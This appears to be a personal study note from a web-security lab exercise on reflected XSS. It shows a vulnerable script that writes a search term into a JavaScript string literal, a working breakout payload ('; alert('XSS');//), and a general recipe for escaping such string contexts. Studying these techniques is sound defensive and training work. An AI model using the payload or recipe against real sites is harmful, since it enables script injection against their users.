---
id: "202606250001"
title: Reflected XSS by breaking out of a JavaScript string literal
date: 2026-06-25
type: case
tags: [xss, reflected-xss, js-string-breakout]
source: "[[9_Lab9-Reflected XSS into a JavaScript string with angle brackets HTML encoded]]"
publish: false
---

```js
var searchTerms = 'sdfsdf13';
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
```

The searched value is assigned to a JS variable *before* it's URL-encoded for the `<img>` tag — so injecting a payload that closes the single-quoted string and adds a statement, while the value is still raw JS source, bypasses the later encoding entirely.

```
'; alert('XSS');//
```

Result: `var searchTerms = 'sdfsdf13'; alert('XSS');//'`. The trailing `//` comments out whatever remains of the original line. The general recipe — [[202606250002 Breaking out of a JS string literal via quote, semicolon, and comment]] — is: close the quote matching the sink's delimiter, terminate the statement, inject the call, comment out the tail.

## Links
- Reusable recipe: [[202606250002 Breaking out of a JS string literal via quote, semicolon, and comment]]
- Same idea one layer deeper, where the closing quote itself gets escaped by a naive filter: [[202607010003 Backslash escape-neutralization bypass]]
